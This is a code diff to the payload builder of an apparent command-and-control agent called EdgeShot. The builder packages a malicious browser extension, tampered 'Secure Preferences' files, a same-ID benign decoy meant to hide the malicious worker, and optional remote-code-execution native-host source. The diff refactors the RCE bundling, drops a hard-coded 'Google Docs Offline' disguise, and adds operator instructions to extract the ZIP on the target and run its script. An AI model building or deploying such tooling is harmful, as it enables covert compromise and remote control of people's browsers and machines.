@@ -305,20 +305,25 @@ class EdgeShotAgent(PayloadType):
             "darwin": "darwin",
         }.get(os_value, "windows")
 
-    def _add_agent_files(self, zout, prefix: str, js_code: str, manifest_code: str, rce_enabled: bool, icons: dict) -> None:
-        """Bundle manifest.json + background.js (+ icons, + RCE source) under ``prefix``."""
+    def _add_agent_files(self, zout, prefix: str, js_code: str, manifest_code: str, icons: dict) -> None:
+        """Bundle manifest.json + background.js (+ icons) under ``prefix``."""
         zout.writestr(f"{prefix}/manifest.json", manifest_code)
         zout.writestr(f"{prefix}/background.js", js_code)
 
         for name, data in (icons or {}).items():
             zout.writestr(f"{prefix}/icons/{name}", data)
 
-        if rce_enabled:
-            rce_dir = self.agent_code_path / "rce"
-            if rce_dir.exists():
-                for f in rce_dir.rglob("*"):
-                    if f.is_file():
-                        zout.writestr(f"{prefix}/rce/{f.name}", f.read_bytes())
+    def _add_rce_source(self, zout) -> None:
+        """Bundle the RCE native-host SOURCE (native-host.c + README) at the ZIP
+        root. It is not compiled here (no Windows cross-compiler in the build
+        container) and is not part of the extension payload — the operator
+        compiles update.exe locally and drops it with execute_file."""
+        rce_dir = self.agent_code_path / "rce"
+        if not rce_dir.exists():
+            return
+        for f in rce_dir.rglob("*"):
+            if f.is_file():
+                zout.write(f, f.relative_to(self.agent_code_path))
 
     # ------------------------------------------------------------------
     # Build
@@ -509,11 +514,7 @@ class EdgeShotAgent(PayloadType):
             for name, data in (icons or {}).items():
                 zout.writestr(f"icons/{name}", data)
             if rce_enabled:
-                rce_dir = self.agent_code_path / "rce"
-                if rce_dir.exists():
-                    for f in rce_dir.rglob("*"):
-                        if f.is_file():
-                            zout.write(f, f.relative_to(self.agent_code_path))
+                self._add_rce_source(zout)
 
         build_message = (
             f"EdgeShot payload generated (mode=zip). "
@@ -589,7 +590,9 @@ class EdgeShotAgent(PayloadType):
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
             zout.writestr("SecurePreferencesClean", prefs_raw)
             zout.writestr("Secure Preferences", patched_bytes)
-            self._add_agent_files(zout, ext_root, js_code, manifest_code_keyed, rce_enabled, icons)
+            self._add_agent_files(zout, ext_root, js_code, manifest_code_keyed, icons)
+            if rce_enabled:
+                self._add_rce_source(zout)
             zout.writestr(script_filename, script_text)
 
         build_message = (
@@ -597,6 +600,12 @@ class EdgeShotAgent(PayloadType):
             f"platform={platform}, id={crx_id}{' (spoofed)' if spoof_id else ' (random)'}). "
             f"Deploy root: {target_dir}. Extract the ZIP on the target and run "
             f"{script_filename}. Callback: {get_url} (GET) / {post_url} (POST)."
+            + (
+                " RCE native host source bundled under rce/ (compile it locally, "
+                "then drop via execute_file)."
+                if rce_enabled
+                else " RCE disabled."
+            )
         )
         return zip_buffer.getvalue(), build_message
 
@@ -639,8 +648,10 @@ class EdgeShotAgent(PayloadType):
         # manifest version), and ScriptCache by the script URL; if B differs, the
         # browser re-registers the worker and A's cached worker is dropped.
         benign_dict = dict(manifest_dict)
-        benign_dict["name"] = "Google Docs Offline"
-        benign_dict["description"] = "Edit, create, and view your documents offline."
+        # The decoy keeps the operator's ADDONNAME/DESCRIPTION (already
+        # substituted into the malicious manifest above) — no fixed
+        # "Google Docs Offline" disguise. GAP only needs the manifest to stay
+        # structurally identical (version, permissions, worker filename).
         benign_code_keyed = json.dumps(benign_dict, indent=2)
 
         benign_bg_path = self.agent_code_path / "benign" / "background.js"
@@ -679,7 +690,9 @@ class EdgeShotAgent(PayloadType):
             zout.writestr("Secure Preferences A", prefs_a_bytes)
             zout.writestr("Secure Preferences B", prefs_b_bytes)
             # Malicious extension A (background.js + icons + optional RCE source).
-            self._add_agent_files(zout, "extension_malicious", js_code, manifest_code_keyed, rce_enabled, icons)
+            self._add_agent_files(zout, "extension_malicious", js_code, manifest_code_keyed, icons)
+            if rce_enabled:
+                self._add_rce_source(zout)
             # Benign decoy B: same ID, inert worker (re-anchors to A's cached worker).
             zout.writestr("extension_benign/manifest.json", benign_code_keyed)
             zout.writestr("extension_benign/background.js", benign_bg_code)
@@ -694,5 +707,11 @@ class EdgeShotAgent(PayloadType):
             f"platform={platform}, id={crx_id}{' (spoofed)' if spoof_id else ' (random)'}). "
             f"Deploy root: {target_dir}. Extract the ZIP on the target and run "
             f"{script_filename}. Callback: {get_url} (GET) / {post_url} (POST)."
+            + (
+                " RCE native host source bundled under rce/ (compile it locally, "
+                "then drop via execute_file)."
+                if rce_enabled
+                else " RCE disabled."
+            )
         )
         return zip_buffer.getvalue(), build_message
